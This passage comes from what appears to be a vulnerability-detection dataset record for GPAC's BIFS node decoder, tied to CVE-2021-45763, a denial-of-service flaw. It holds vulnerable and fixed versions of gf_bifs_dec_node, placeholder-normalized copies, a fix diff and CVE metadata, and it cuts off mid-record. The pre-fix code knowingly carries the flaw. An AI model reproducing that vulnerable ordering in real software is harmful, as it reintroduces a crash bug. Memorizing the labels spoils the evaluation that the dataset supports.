if (!codec->pCurrentProto) UpdateTimeNode(codec, new_node);
else skip_init = GF_TRUE;
reset_qp14 = !codec->coord_stored;
switch (node_tag) {
case TAG_MPEG4_Coordinate:
case TAG_MPEG4_Coordinate2D:
gf_bifs_dec_qp14_enter(codec, GF_TRUE);
}
if (gf_bs_read_int(bs, 1)) {
e = gf_bifs_dec_node_mask(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);
} else {
e = gf_bifs_dec_node_list(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);
}
if (codec->coord_stored && reset_qp14)
gf_bifs_dec_qp14_reset(codec);
if (e) {
codec->LastError = e;
gf_node_register(new_node, NULL);
gf_node_unregister(new_node, NULL);
return NULL;
}
if (!skip_init)
gf_node_init(new_node);
switch (node_tag) {
case TAG_MPEG4_Coordinate:
case TAG_MPEG4_Coordinate2D:
gf_bifs_dec_qp14_enter(codec, GF_FALSE);
break;
case TAG_MPEG4_Script:
if (codec->scenegraph == codec->current_graph) {
gf_sg_script_load(new_node);
}
break;
case TAG_MPEG4_Conditional:
SetupConditional(codec, new_node);
break;
}
#if 0
if (proto && (codec->scenegraph == codec->current_graph)) {
codec->LastError = gf_sg_proto_load_code(new_node);
}
#endif
return new_node;
}","GF_Node *gf_bifs_dec_node(GF_BifsDecoder * VAR_0, GF_BitStream *VAR_1, u32 VAR_2)
{
u32 VAR_3, VAR_4, VAR_5, VAR_6, VAR_7, VAR_8;
Bool VAR_9, VAR_10;
GF_Node *VAR_11;
GF_Err VAR_12;
GF_Proto *VAR_13;
void SetupConditional(GF_BifsDecoder *VAR_0, GF_Node *VAR_14);
char VAR_15[1000];
#if 0
if (!VAR_0->info) {
VAR_0->LastError = VAR_16;
return NULL;
}
#endif
VAR_8 = VAR_17;
if (gf_bs_read_int(VAR_1, 1)) {
VAR_3 = 1 + gf_bs_read_int(VAR_1, VAR_0->info->config.NodeIDBits);
if (VAR_3 == (u32) (1<<VAR_0->info->config.NodeIDBits))
return NULL;
VAR_11 = gf_sg_find_node(VAR_0->current_graph, VAR_3);
if (VAR_11 && !gf_node_in_table(VAR_11, VAR_2)) {
GF_LOG(VAR_18, VAR_19, (""[BIFS] Node %s not allowed as field/child of NDT type %d\n"", gf_node_get_class_name(VAR_11), VAR_2));
VAR_0->LastError = VAR_20;
return NULL;
}
if (!VAR_11) {
VAR_0->LastError = VAR_20;
} else {
switch (gf_node_get_tag(VAR_11)) {
case VAR_21:
{
u32 VAR_22 = ((M_Coordinate *)VAR_11)->point.count;
gf_bifs_dec_qp14_enter(VAR_0, VAR_23);
gf_bifs_dec_qp14_set_length(VAR_0, VAR_22);
gf_bifs_dec_qp14_enter(VAR_0, VAR_24);
}
break;
case VAR_25:
{
u32 VAR_22 = ((M_Coordinate2D *)VAR_11)->point.count;
gf_bifs_dec_qp14_enter(VAR_0, VAR_23);
gf_bifs_dec_qp14_set_length(VAR_0, VAR_22);
gf_bifs_dec_qp14_enter(VAR_0, VAR_24);
}
break;
}
}
return VAR_11;
}
VAR_3 = 0;
VAR_15[0] = 0;
VAR_6 = 0;
VAR_13 = NULL;
while (1) {
VAR_4 = gf_bifs_get_ndt_bits(VAR_2, VAR_8);
if ((VAR_8==1) && (VAR_4 > 8 * gf_bs_available(VAR_1)) ) {
VAR_0->LastError = VAR_26;
return NULL;
}
VAR_5 = gf_bs_read_int(VAR_1, VAR_4);
if (VAR_5) break;
VAR_8 += 1;
if (VAR_8 > VAR_27) {
VAR_0->LastError = VAR_28;
return NULL;
}
}
if (VAR_8==2 && VAR_5==1) {
VAR_7 = gf_bs_read_int(VAR_1, VAR_0->info->config.ProtoIDBits);
VAR_13 = gf_sg_find_proto(VAR_0->current_graph, VAR_7, NULL);
if (!VAR_13 && VAR_0->current_graph != VAR_0->scenegraph)
VAR_13 = gf_sg_find_proto(VAR_0->scenegraph, VAR_7, NULL);
if (!VAR_13) {
VAR_0->LastError = VAR_20;
return NULL;
}
} else {
VAR_6 = gf_bifs_ndt_get_node_type(VAR_2, VAR_5, VAR_8);
}
if ((VAR_6 == VAR_29) && VAR_0->info->config.Use3DMeshCoding) {
if (gf_bs_read_int(VAR_1, 1)) {
gf_bs_read_int(VAR_1, VAR_0->info->config.NodeIDBits);
if (VAR_0->UseName) gf_bifs_dec_name(VAR_1, VAR_15, 1000);
}
return NULL;
}
if (!VAR_6 && !VAR_13) {
VAR_0->LastError = VAR_20;
return NULL;
}
if (gf_bs_read_int(VAR_1, 1)) {
if (!VAR_0->info->config.NodeIDBits) {
VAR_0->LastError = VAR_30;
return NULL;
}
VAR_3 = 1 + gf_bs_read_int(VAR_1, VAR_0->info->config.NodeIDBits);
if (VAR_0->UseName) gf_bifs_dec_name(VAR_1, VAR_15, 1000);
}
VAR_11 = NULL;
VAR_9 = VAR_24;
#if 0
if (VAR_3 && !VAR_0->dec_memory_mode) {
VAR_11 = gf_sg_find_node(VAR_0->current_graph, VAR_3);
if (VAR_11) {
if (VAR_13) {
if ((gf_node_get_tag(VAR_11) != VAR_31) || (gf_node_get_proto(VAR_11) != VAR_13)) {
VAR_0->LastError = VAR_30;
return NULL;
}
VAR_9 = 1;
} else {
if (gf_node_get_tag(VAR_11) != VAR_6) {
VAR_0->LastError = VAR_30;
return NULL;
}
VAR_9 = 1;
}
}
}
if (!VAR_11)
#endif
{
if (VAR_13) {
VAR_11 = gf_sg_proto_create_instance(VAR_0->current_graph, VAR_13);
if (! VAR_13->ExternProto.count) VAR_9 = VAR_23;
} else {
VAR_11 = gf_node_new(VAR_0->current_graph, VAR_6);
}
}
if (!VAR_11) {
VAR_0->LastError = VAR_32;
return NULL;
}
if (VAR_3) {
if (strlen(VAR_15)) {
gf_node_set_id(VAR_11, VAR_3, VAR_15);
} else {
gf_node_set_id(VAR_11, VAR_3, NULL);
}
}
if (!VAR_0->pCurrentProto) UpdateTimeNode(VAR_0, VAR_11);
else VAR_9 = VAR_23;
VAR_10 = !VAR_0->coord_stored;
switch (VAR_6) {
case VAR_21:
case VAR_25:
gf_bifs_dec_qp14_enter(VAR_0, VAR_23);
}
if (gf_bs_read_int(VAR_1, 1)) {
VAR_12 = gf_bifs_dec_node_mask(VAR_0, VAR_1, VAR_11, VAR_13 ? VAR_23 : VAR_24);
} else {
VAR_12 = gf_bifs_dec_node_list(VAR_0, VAR_1, VAR_11, VAR_13 ? VAR_23 : VAR_24);
}
if (VAR_0->coord_stored && VAR_10)
gf_bifs_dec_qp14_reset(VAR_0);
if (VAR_12) {
VAR_0->LastError = VAR_12;
gf_node_register(VAR_11, NULL);
gf_node_unregister(VAR_11, NULL);
return NULL;
}
if (!VAR_9)
gf_node_init(VAR_11);
switch (VAR_6) {
case VAR_21:
case VAR_25:
gf_bifs_dec_qp14_enter(VAR_0, VAR_24);
break;
case VAR_33:
if (VAR_0->scenegraph == VAR_0->current_graph) {
gf_sg_script_load(VAR_11);
}
break;
case VAR_34:
SetupConditional(VAR_0, VAR_11);
break;
}
#if 0
if (VAR_13 && (VAR_0->scenegraph == VAR_0->current_graph)) {
VAR_0->LastError = gf_sg_proto_load_code(VAR_11);
}
#endif
return VAR_11;
}",gpac/d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec/field_decode.c/vul/before/1.json,"GF_Node *gf_bifs_dec_node(GF_BifsDecoder * codec, GF_BitStream *bs, u32 NDT_Tag)
{
	u32 nodeID, NDTBits, node_type, node_tag, ProtoID, BVersion;
	Bool skip_init, reset_qp14;
	GF_Node *new_node;
	GF_Err e;
	GF_Proto *proto;
	void SetupConditional(GF_BifsDecoder *codec, GF_Node *node);

	//to store the UseName
	char name[1000];

#if 0
	/*should only happen with inputSensor, in which case this is BAAAAD*/
	if (!codec->info) {
		codec->LastError = GF_BAD_PARAM;
		return NULL;
	}
#endif


	BVersion = GF_BIFS_V1;

	/*this is a USE statement*/
	if (gf_bs_read_int(bs, 1)) {
		nodeID = 1 + gf_bs_read_int(bs, codec->info->config.NodeIDBits);
		/*NULL node is encoded as USE with ID = all bits to 1*/
		if (nodeID == (u32) (1<<codec->info->config.NodeIDBits))
			return NULL;
		//find node
		new_node = gf_sg_find_node(codec->current_graph, nodeID);

		//check node is allowed for the given NDT
		if (new_node && !gf_node_in_table(new_node, NDT_Tag)) {
			GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, (""[BIFS] Node %s not allowed as field/child of NDT type %d\n"", gf_node_get_class_name(new_node), NDT_Tag));
			codec->LastError = GF_SG_UNKNOWN_NODE;
			return NULL;
		}

		if (!new_node) {
			codec->LastError = GF_SG_UNKNOWN_NODE;
		} else {
			/*restore QP14 length*/
			switch (gf_node_get_tag(new_node)) {
			case TAG_MPEG4_Coordinate:
			{
				u32 nbCoord = ((M_Coordinate *)new_node)->point.count;
				gf_bifs_dec_qp14_enter(codec, GF_TRUE);
				gf_bifs_dec_qp14_set_length(codec, nbCoord);
				gf_bifs_dec_qp14_enter(codec, GF_FALSE);
			}
			break;
			case TAG_MPEG4_Coordinate2D:
			{
				u32 nbCoord = ((M_Coordinate2D *)new_node)->point.count;
				gf_bifs_dec_qp14_enter(codec, GF_TRUE);
				gf_bifs_dec_qp14_set_length(codec, nbCoord);
				gf_bifs_dec_qp14_enter(codec, GF_FALSE);
			}
			break;
			}
		}
		return new_node;
	}

	//this is a new node
	nodeID = 0;
	name[0] = 0;
	node_tag = 0;
	proto = NULL;

	//browse all node groups
	while (1) {
		NDTBits = gf_bifs_get_ndt_bits(NDT_Tag, BVersion);
		/*this happens in replacescene where no top-level node is present (externProto)*/
		if ((BVersion==1) && (NDTBits > 8 * gf_bs_available(bs)) ) {
			codec->LastError = GF_OK;
			return NULL;
		}

		node_type = gf_bs_read_int(bs, NDTBits);
		if (node_type) break;

		//increment BIFS version
		BVersion += 1;
		//not supported
		if (BVersion > GF_BIFS_NUM_VERSION) {
			codec->LastError = GF_BIFS_UNKNOWN_VERSION;
			return NULL;
		}
	}
	if (BVersion==2 && node_type==1) {
		ProtoID = gf_bs_read_int(bs, codec->info->config.ProtoIDBits);
		/*look in current graph for the proto - this may be a proto graph*/
		proto = gf_sg_find_proto(codec->current_graph, ProtoID, NULL);
		/*this was in proto so look in main scene*/
		if (!proto && codec->current_graph != codec->scenegraph)
			proto = gf_sg_find_proto(codec->scenegraph, ProtoID, NULL);

		if (!proto) {
			codec->LastError = GF_SG_UNKNOWN_NODE;
			return NULL;
		}
	} else {
		node_tag = gf_bifs_ndt_get_node_type(NDT_Tag, node_type, BVersion);
	}

	/*special handling of 3D mesh*/
	if ((node_tag == TAG_MPEG4_IndexedFaceSet) && codec->info->config.Use3DMeshCoding) {
		if (gf_bs_read_int(bs, 1)) {
			/*nodeID = 1 + */gf_bs_read_int(bs, codec->info->config.NodeIDBits);
			if (codec->UseName) gf_bifs_dec_name(bs, name, 1000);
		}
		/*parse the 3DMesh node*/
		return NULL;
	}
	/*unknown node*/
	if (!node_tag && !proto) {
		codec->LastError = GF_SG_UNKNOWN_NODE;
		return NULL;
	}


	/*DEF'd flag*/
	if (gf_bs_read_int(bs, 1)) {
		if (!codec->info->config.NodeIDBits) {
			codec->LastError = GF_NON_COMPLIANT_BITSTREAM;
			return NULL;
		}
		nodeID = 1 + gf_bs_read_int(bs, codec->info->config.NodeIDBits);
		if (codec->UseName) gf_bifs_dec_name(bs, name, 1000);
	}

	new_node = NULL;
	skip_init = GF_FALSE;

	/*don't check node IDs duplicate since VRML may use them...*/
#if 0
	/*if a node with same DEF is already in the scene, use it
	we don't do that in memory mode because commands may force replacement
	of a node with a new node with same ID, and we want to be able to dump it (otherwise we would
	dump a USE)*/
	if (nodeID && !codec->dec_memory_mode) {
		new_node = gf_sg_find_node(codec->current_graph, nodeID);
		if (new_node) {
			if (proto) {
				if ((gf_node_get_tag(new_node) != TAG_ProtoNode) || (gf_node_get_proto(new_node) != proto)) {
					codec->LastError = GF_NON_COMPLIANT_BITSTREAM;
					return NULL;
				}
				skip_init = 1;
			} else {
				if (gf_node_get_tag(new_node) != node_tag) {
					codec->LastError = GF_NON_COMPLIANT_BITSTREAM;
					return NULL;
				}
				skip_init = 1;
			}
		}
	}
	if (!new_node)
#endif

	{
		if (proto) {
			/*create proto interface*/
			new_node = gf_sg_proto_create_instance(codec->current_graph, proto);
            //don't init protos unless externProto (in which case we want init for hardcoded protos)
            if (! proto->ExternProto.count) skip_init = GF_TRUE;
		} else {
			new_node = gf_node_new(codec->current_graph, node_tag);
		}
	}
	if (!new_node) {
		codec->LastError = GF_NOT_SUPPORTED;
		return NULL;
	}

	/*update default time fields except in proto parsing*/
	if (!codec->pCurrentProto) UpdateTimeNode(codec, new_node);
	/*nodes are only init outside protos, nodes internal to protos are never intialized */
	else skip_init = GF_TRUE;

	/*if coords were not stored for QP14 before coding this node, reset QP14 it when leaving*/
	reset_qp14 = !codec->coord_stored;

	/*QP 14 is a special quant mode for IndexFace/Line(2D)Set to quantize the
	coordonate(2D) child, based on the first field parsed
	we must check the type of the node and notfy the QP*/
	switch (node_tag) {
	case TAG_MPEG4_Coordinate:
	case TAG_MPEG4_Coordinate2D:
		gf_bifs_dec_qp14_enter(codec, GF_TRUE);
	}

	if (gf_bs_read_int(bs, 1)) {
		e = gf_bifs_dec_node_mask(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);
	} else {
		e = gf_bifs_dec_node_list(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);
	}
	if (codec->coord_stored && reset_qp14)
		gf_bifs_dec_qp14_reset(codec);

	if (e) {
		codec->LastError = e;
		/*register*/
		gf_node_register(new_node, NULL);
		/*unregister (deletes)*/
		gf_node_unregister(new_node, NULL);
		return NULL;
	}

	/*VRML: ""The transformation hierarchy shall be a directed acyclic graph; results are undefined if a node
	in the transformation hierarchy is its own ancestor""
	that's good, because the scene graph can't handle cyclic graphs (destroy will never be called).
	We therefore only register the node once parsed*/
	if (nodeID) {
		if (strlen(name)) {
			gf_node_set_id(new_node, nodeID, name);
		} else {
			gf_node_set_id(new_node, nodeID, NULL);
		}
	}

	if (!skip_init)
		gf_node_init(new_node);

	switch (node_tag) {
	case TAG_MPEG4_Coordinate:
	case TAG_MPEG4_Coordinate2D:
		gf_bifs_dec_qp14_enter(codec, GF_FALSE);
		break;
	case TAG_MPEG4_Script:
		/*load script if in main graph (useless to load in proto declaration)*/
		if (codec->scenegraph == codec->current_graph) {
			gf_sg_script_load(new_node);
		}
		break;
	/*conditionals must be init*/
	case TAG_MPEG4_Conditional:
		SetupConditional(codec, new_node);
		break;
	}

	/*proto is initialized upon the first traversal to have the same behavior as wth BT/XMT loading*/
#if 0
	/*if new node is a proto and we're in the top scene, load proto code*/
	if (proto && (codec->scenegraph == codec->current_graph)) {
		codec->LastError = gf_sg_proto_load_code(new_node);
	}
#endif

	return new_node;
}","GF_Node *gf_bifs_dec_node(GF_BifsDecoder * VAR_0, GF_BitStream *VAR_1, u32 VAR_2)
{
	u32 VAR_3, VAR_4, VAR_5, VAR_6, VAR_7, VAR_8;
	Bool VAR_9, VAR_10;
	GF_Node *VAR_11;
	GF_Err VAR_12;
	GF_Proto *VAR_13;
	void SetupConditional(GF_BifsDecoder *VAR_0, GF_Node *VAR_14);

	/* COMMENT_0 */
	char VAR_15[1000];

#if 0
	/* COMMENT_1 */
	if (!VAR_0->info) {
		VAR_0->LastError = VAR_16;
		return NULL;
	}
#endif


	VAR_8 = VAR_17;

	/* COMMENT_2 */
	if (gf_bs_read_int(VAR_1, 1)) {
		VAR_3 = 1 + gf_bs_read_int(VAR_1, VAR_0->info->config.NodeIDBits);
		/* COMMENT_3 */
		if (VAR_3 == (u32) (1<<VAR_0->info->config.NodeIDBits))
			return NULL;
		/* COMMENT_4 */
		VAR_11 = gf_sg_find_node(VAR_0->current_graph, VAR_3);

		/* COMMENT_5 */
		if (VAR_11 && !gf_node_in_table(VAR_11, VAR_2)) {
			GF_LOG(VAR_18, VAR_19, (""[BIFS] Node %s not allowed as field/child of NDT type %d\n"", gf_node_get_class_name(VAR_11), VAR_2));
			VAR_0->LastError = VAR_20;
			return NULL;
		}

		if (!VAR_11) {
			VAR_0->LastError = VAR_20;
		} else {
			/* COMMENT_6 */
			switch (gf_node_get_tag(VAR_11)) {
			case VAR_21:
			{
				u32 VAR_22 = ((M_Coordinate *)VAR_11)->point.count;
				gf_bifs_dec_qp14_enter(VAR_0, VAR_23);
				gf_bifs_dec_qp14_set_length(VAR_0, VAR_22);
				gf_bifs_dec_qp14_enter(VAR_0, VAR_24);
			}
			break;
			case VAR_25:
			{
				u32 VAR_22 = ((M_Coordinate2D *)VAR_11)->point.count;
				gf_bifs_dec_qp14_enter(VAR_0, VAR_23);
				gf_bifs_dec_qp14_set_length(VAR_0, VAR_22);
				gf_bifs_dec_qp14_enter(VAR_0, VAR_24);
			}
			break;
			}
		}
		return VAR_11;
	}

	/* COMMENT_7 */
	VAR_3 = 0;
	VAR_15[0] = 0;
	VAR_6 = 0;
	VAR_13 = NULL;

	/* COMMENT_8 */
	while (1) {
		VAR_4 = gf_bifs_get_ndt_bits(VAR_2, VAR_8);
		/* COMMENT_9 */
		if ((VAR_8==1) && (VAR_4 > 8 * gf_bs_available(VAR_1)) ) {
			VAR_0->LastError = VAR_26;
			return NULL;
		}

		VAR_5 = gf_bs_read_int(VAR_1, VAR_4);
		if (VAR_5) break;

		/* COMMENT_10 */
		VAR_8 += 1;
		/* COMMENT_11 */
		if (VAR_8 > VAR_27) {
			VAR_0->LastError = VAR_28;
			return NULL;
		}
	}
	if (VAR_8==2 && VAR_5==1) {
		VAR_7 = gf_bs_read_int(VAR_1, VAR_0->info->config.ProtoIDBits);
		/* COMMENT_12 */
		VAR_13 = gf_sg_find_proto(VAR_0->current_graph, VAR_7, NULL);
		/* COMMENT_13 */
		if (!VAR_13 && VAR_0->current_graph != VAR_0->scenegraph)
			VAR_13 = gf_sg_find_proto(VAR_0->scenegraph, VAR_7, NULL);

		if (!VAR_13) {
			VAR_0->LastError = VAR_20;
			return NULL;
		}
	} else {
		VAR_6 = gf_bifs_ndt_get_node_type(VAR_2, VAR_5, VAR_8);
	}

	/* COMMENT_14 */
	if ((VAR_6 == VAR_29) && VAR_0->info->config.Use3DMeshCoding) {
		if (gf_bs_read_int(VAR_1, 1)) {
			/* COMMENT_15 */gf_bs_read_int(VAR_1, VAR_0->info->config.NodeIDBits);
			if (VAR_0->UseName) gf_bifs_dec_name(VAR_1, VAR_15, 1000);
		}
		/* COMMENT_16 */
		return NULL;
	}
	/* COMMENT_17 */
	if (!VAR_6 && !VAR_13) {
		VAR_0->LastError = VAR_20;
		return NULL;
	}


	/* COMMENT_18 */
	if (gf_bs_read_int(VAR_1, 1)) {
		if (!VAR_0->info->config.NodeIDBits) {
			VAR_0->LastError = VAR_30;
			return NULL;
		}
		VAR_3 = 1 + gf_bs_read_int(VAR_1, VAR_0->info->config.NodeIDBits);
		if (VAR_0->UseName) gf_bifs_dec_name(VAR_1, VAR_15, 1000);
	}

	VAR_11 = NULL;
	VAR_9 = VAR_24;

	/* COMMENT_19 */
#if 0
	/* COMMENT_20 */
                                                                       
                                                                                              
              
	if (VAR_3 && !VAR_0->dec_memory_mode) {
		VAR_11 = gf_sg_find_node(VAR_0->current_graph, VAR_3);
		if (VAR_11) {
			if (VAR_13) {
				if ((gf_node_get_tag(VAR_11) != VAR_31) || (gf_node_get_proto(VAR_11) != VAR_13)) {
					VAR_0->LastError = VAR_30;
					return NULL;
				}
				VAR_9 = 1;
			} else {
				if (gf_node_get_tag(VAR_11) != VAR_6) {
					VAR_0->LastError = VAR_30;
					return NULL;
				}
				VAR_9 = 1;
			}
		}
	}
	if (!VAR_11)
#endif

	{
		if (VAR_13) {
			/* COMMENT_24 */
			VAR_11 = gf_sg_proto_create_instance(VAR_0->current_graph, VAR_13);
            /* COMMENT_25 */
            if (! VAR_13->ExternProto.count) VAR_9 = VAR_23;
		} else {
			VAR_11 = gf_node_new(VAR_0->current_graph, VAR_6);
		}
	}
	if (!VAR_11) {
		VAR_0->LastError = VAR_32;
		return NULL;
	}

	/* COMMENT_26 */
	if (!VAR_0->pCurrentProto) UpdateTimeNode(VAR_0, VAR_11);
	/* COMMENT_27 */
	else VAR_9 = VAR_23;

	/* COMMENT_28 */
	VAR_10 = !VAR_0->coord_stored;

	/* COMMENT_29 */
                                                      
                                                      
	switch (VAR_6) {
	case VAR_21:
	case VAR_25:
		gf_bifs_dec_qp14_enter(VAR_0, VAR_23);
	}

	if (gf_bs_read_int(VAR_1, 1)) {
		VAR_12 = gf_bifs_dec_node_mask(VAR_0, VAR_1, VAR_11, VAR_13 ? VAR_23 : VAR_24);
	} else {
		VAR_12 = gf_bifs_dec_node_list(VAR_0, VAR_1, VAR_11, VAR_13 ? VAR_23 : VAR_24);
	}
	if (VAR_0->coord_stored && VAR_10)
		gf_bifs_dec_qp14_reset(VAR_0);

	if (VAR_12) {
		VAR_0->LastError = VAR_12;
		/* COMMENT_32 */
		gf_node_register(VAR_11, NULL);
		/* COMMENT_33 */
		gf_node_unregister(VAR_11, NULL);
		return NULL;
	}

	/* COMMENT_34 */
                                                     
                                                                                                
                                                  
	if (VAR_3) {
		if (strlen(VAR_15)) {
			gf_node_set_id(VAR_11, VAR_3, VAR_15);
		} else {
			gf_node_set_id(VAR_11, VAR_3, NULL);
		}
	}

	if (!VAR_9)
		gf_node_init(VAR_11);

	switch (VAR_6) {
	case VAR_21:
	case VAR_25:
		gf_bifs_dec_qp14_enter(VAR_0, VAR_24);
		break;
	case VAR_33:
		/* COMMENT_38 */
		if (VAR_0->scenegraph == VAR_0->current_graph) {
			gf_sg_script_load(VAR_11);
		}
		break;
	/* COMMENT_39 */
	case VAR_34:
		SetupConditional(VAR_0, VAR_11);
		break;
	}

	/* COMMENT_40 */
#if 0
	/* COMMENT_41 */
	if (VAR_13 && (VAR_0->scenegraph == VAR_0->current_graph)) {
		VAR_0->LastError = gf_sg_proto_load_code(VAR_11);
	}
#endif

	return VAR_11;
}",gpac/d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec/field_decode.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -176,6 +176,40 @@
 		return NULL;
 	}
 
+	/*update default time fields except in proto parsing*/
+	if (!codec->pCurrentProto) UpdateTimeNode(codec, new_node);
+	/*nodes are only init outside protos, nodes internal to protos are never intialized */
+	else skip_init = GF_TRUE;
+
+	/*if coords were not stored for QP14 before coding this node, reset QP14 it when leaving*/
+	reset_qp14 = !codec->coord_stored;
+
+	/*QP 14 is a special quant mode for IndexFace/Line(2D)Set to quantize the
+	coordonate(2D) child, based on the first field parsed
+	we must check the type of the node and notfy the QP*/
+	switch (node_tag) {
+	case TAG_MPEG4_Coordinate:
+	case TAG_MPEG4_Coordinate2D:
+		gf_bifs_dec_qp14_enter(codec, GF_TRUE);
+	}
+
+	if (gf_bs_read_int(bs, 1)) {
+		e = gf_bifs_dec_node_mask(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);
+	} else {
+		e = gf_bifs_dec_node_list(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);
+	}
+	if (codec->coord_stored && reset_qp14)
+		gf_bifs_dec_qp14_reset(codec);
+
+	if (e) {
+		codec->LastError = e;
+		/*register*/
+		gf_node_register(new_node, NULL);
+		/*unregister (deletes)*/
+		gf_node_unregister(new_node, NULL);
+		return NULL;
+	}
+
 	/*VRML: ""The transformation hierarchy shall be a directed acyclic graph; results are undefined if a node
 	in the transformation hierarchy is its own ancestor""
 	that's good, because the scene graph can't handle cyclic graphs (destroy will never be called).
@@ -188,41 +222,6 @@
 		}
 	}
 
-
-	/*update default time fields except in proto parsing*/
-	if (!codec->pCurrentProto) UpdateTimeNode(codec, new_node);
-	/*nodes are only init outside protos, nodes internal to protos are never intialized */
-	else skip_init = GF_TRUE;
-
-	/*if coords were not stored for QP14 before coding this node, reset QP14 it when leaving*/
-	reset_qp14 = !codec->coord_stored;
-
-	/*QP 14 is a special quant mode for IndexFace/Line(2D)Set to quantize the
-	coordonate(2D) child, based on the first field parsed
-	we must check the type of the node and notfy the QP*/
-	switch (node_tag) {
-	case TAG_MPEG4_Coordinate:
-	case TAG_MPEG4_Coordinate2D:
-		gf_bifs_dec_qp14_enter(codec, GF_TRUE);
-	}
-
-	if (gf_bs_read_int(bs, 1)) {
-		e = gf_bifs_dec_node_mask(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);
-	} else {
-		e = gf_bifs_dec_node_list(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);
-	}
-	if (codec->coord_stored && reset_qp14)
-		gf_bifs_dec_qp14_reset(codec);
-
-	if (e) {
-		codec->LastError = e;
-		/*register*/
-		gf_node_register(new_node, NULL);
-		/*unregister (deletes)*/
-		gf_node_unregister(new_node, NULL);
-		return NULL;
-	}
-
 	if (!skip_init)
 		gf_node_init(new_node);
 ","{'deleted_lines': ['', '\t/*update default time fields except in proto parsing*/', '\tif (!codec->pCurrentProto) UpdateTimeNode(codec, new_node);', '\t/*nodes are only init outside protos, nodes internal to protos are never intialized */', '\telse skip_init = GF_TRUE;', '', '\t/*if coords were not stored for QP14 before coding this node, reset QP14 it when leaving*/', '\treset_qp14 = !codec->coord_stored;', '', '\t/*QP 14 is a special quant mode for IndexFace/Line(2D)Set to quantize the', '\tcoordonate(2D) child, based on the first field parsed', '\twe must check the type of the node and notfy the QP*/', '\tswitch (node_tag) {', '\tcase TAG_MPEG4_Coordinate:', '\tcase TAG_MPEG4_Coordinate2D:', '\t\tgf_bifs_dec_qp14_enter(codec, GF_TRUE);', '\t}', '', '\tif (gf_bs_read_int(bs, 1)) {', '\t\te = gf_bifs_dec_node_mask(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);', '\t} else {', '\t\te = gf_bifs_dec_node_list(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);', '\t}', '\tif (codec->coord_stored && reset_qp14)', '\t\tgf_bifs_dec_qp14_reset(codec);', '', '\tif (e) {', '\t\tcodec->LastError = e;', '\t\t/*register*/', '\t\tgf_node_register(new_node, NULL);', '\t\t/*unregister (deletes)*/', '\t\tgf_node_unregister(new_node, NULL);', '\t\treturn NULL;', '\t}', ''], 'added_lines': ['\t/*update default time fields except in proto parsing*/', '\tif (!codec->pCurrentProto) UpdateTimeNode(codec, new_node);', '\t/*nodes are only init outside protos, nodes internal to protos are never intialized */', '\telse skip_init = GF_TRUE;', '', '\t/*if coords were not stored for QP14 before coding this node, reset QP14 it when leaving*/', '\treset_qp14 = !codec->coord_stored;', '', '\t/*QP 14 is a special quant mode for IndexFace/Line(2D)Set to quantize the', '\tcoordonate(2D) child, based on the first field parsed', '\twe must check the type of the node and notfy the QP*/', '\tswitch (node_tag) {', '\tcase TAG_MPEG4_Coordinate:', '\tcase TAG_MPEG4_Coordinate2D:', '\t\tgf_bifs_dec_qp14_enter(codec, GF_TRUE);', '\t}', '', '\tif (gf_bs_read_int(bs, 1)) {', '\t\te = gf_bifs_dec_node_mask(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);', '\t} else {', '\t\te = gf_bifs_dec_node_list(codec, bs, new_node, proto ? GF_TRUE : GF_FALSE);', '\t}', '\tif (codec->coord_stored && reset_qp14)', '\t\tgf_bifs_dec_qp14_reset(codec);', '', '\tif (e) {', '\t\tcodec->LastError = e;', '\t\t/*register*/', '\t\tgf_node_register(new_node, NULL);', '\t\t/*unregister (deletes)*/', '\t\tgf_node_unregister(new_node, NULL);', '\t\treturn NULL;', '\t}', '']}",True,GPAC v1.1.0 was discovered to contain an invalid call in the function gf_node_changed(). This vulnerability can lead to a Denial of Service (DoS).,5.5,MEDIUM,1,valid,2021-12-13T12:04:59Z,4
CVE-2021-45763,['CWE-Other'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1974,d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec,https://github.com/gpac/gpac/commit/d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec,src/bifs/field_decode.c,gf_bifs_dec_sf_field,"GF_Err gf_bifs_dec_sf_field(GF_BifsDecoder * codec, GF_BitStream *bs, GF_Node *node, GF_FieldInfo *field, Bool is_mem_com)
{
GF_Err e;
GF_Node *new_node;
u32 size, length, w, h, i;
char *buffer;
if (codec->ActiveQP && node) {
e = gf_bifs_dec_unquant_field(codec, bs, node, field);
if (e != GF_EOS) return e;
}
switch (field->fieldType) {
case GF_SG_VRML_SFBOOL:
* ((SFBool *) field->far_ptr) = (SFBool) gf_bs_read_int(bs, 1);
break;
case GF_SG_VRML_SFCOLOR:
((SFColor *)field->far_ptr)->red = BD_ReadSFFloat(codec, bs);
((SFColor *)field->far_ptr)->green = BD_ReadSFFloat(codec, bs);
((SFColor *)field->far_ptr)->blue = BD_ReadSFFloat(codec, bs);
break;
case GF_SG_VRML_SFFLOAT:
*((SFFloat *)field->far_ptr) = BD_ReadSFFloat(codec, bs);
break;
case GF_SG_VRML_SFINT32:
*((SFInt32 *)field->far_ptr) = (s32) gf_bs_read_int(bs, 32);
break;
case GF_SG_VRML_SFTIME:
*((SFTime *)field->far_ptr) = gf_bs_read_double(bs);
if (node) BD_CheckSFTimeOffset(codec, node, field);
break;
case GF_SG_VRML_SFVEC2F:
((SFVec2f *)field->far_ptr)->x = BD_ReadSFFloat(codec, bs);
((SFVec2f *)field->far_ptr)->y = BD_ReadSFFloat(codec, bs);
break;
case GF_SG_VRML_SFVEC3F:
((SFVec3f *)field->far_ptr)->x = BD_ReadSFFloat(codec, bs);
((SFVec3f *)field->far_ptr)->y = BD_ReadSFFloat(codec, bs);
((SFVec3f *)field->far_ptr)->z = BD_ReadSFFloat(codec, bs);
break;
case GF_SG_VRML_SFROTATION:
